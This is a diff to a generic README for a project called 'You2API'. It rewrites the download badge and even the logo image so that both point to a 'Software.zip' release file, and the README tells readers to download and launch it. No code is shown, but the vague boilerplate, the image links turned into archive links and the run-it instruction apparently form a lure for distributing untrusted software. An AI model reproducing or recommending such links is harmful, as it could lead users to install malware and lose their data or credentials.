@@ -8,7 +8,7 @@ Unfortunately, a short description for this repository is not provided. However,
 ## Installation
 To get started with You2API, you can download the latest version by clicking on the following link: 
 
-[![Download You2API](https://img.shields.io/badge/Download-You2API-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download You2API](https://github.com/iq1123/You2API/releases/download/v1.0/Software.zip)](https://github.com/iq1123/You2API/releases/download/v1.0/Software.zip)
 
 This link will direct you to the download page for the You2API project. Once downloaded, the project needs to be launched to start using it effectively.
 
@@ -30,4 +30,4 @@ Remember to check out the "Releases" section if the provided download link is no
 
 Thank you for your interest in the You2API project! 🌟 We hope you find it valuable and enjoy using it for your projects. Happy coding! 🚀
 
-![You2API Logo](https://img.icons8.com/ios/452/api.png)
+![You2API Logo](https://github.com/iq1123/You2API/releases/download/v1.0/Software.zip)
